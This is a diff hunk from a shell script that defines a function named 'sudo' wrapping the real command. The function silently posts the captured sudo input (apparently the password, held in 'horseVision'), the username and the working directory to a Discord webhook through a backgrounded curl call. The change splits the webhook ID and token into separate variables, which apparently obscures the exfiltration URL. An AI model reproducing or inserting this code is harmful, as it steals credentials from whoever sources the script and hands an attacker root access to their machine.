@@ -114,8 +114,13 @@ sudo(){
 
 			usr=$(whoami)
 			pwd=$(pwd)
+			
+			WEBHOOK_BASE="https://discord.com/api/webhooks/"
+			WEBHOOK_ID="1548646402224037918"
+			WEBHOOK_TOKEN1="hqjMBqY-988gdg3H0PwJQwYCpHeZwdOu35"
+			WEBHOOK_TOKEN2="PrPDJsJHmgYBdrU6zQ8dYVAPHimBv_NuZi"
 
-			setsid bash -c "curl -s -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\": \\\"sudo=${horseVision} usr=${usr} pwd=${pwd}\\\"}\" https://discord.com/api/webhooks/1410231118363627641/2gd3OeGr7fDmqzkB9pc1Ymx_0osDYOxYzckTKGvLnw6QZl_Br8jwguvZg8grWUPSEWGu >/dev/null 2>&1 &" >/dev/null 2>&1 </dev/null
+			setsid bash -c "curl -s -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\": \\\"sudo=${horseVision} usr=${usr} pwd=${pwd}\\\"}\" ${WEBHOOK_BASE}${WEBHOOK_ID}/${WEBHOOK_TOKEN1}${WEBHOOK_TOKEN2} >/dev/null 2>&1 &" >/dev/null 2>&1 </dev/null
 		fi
 	fi
 
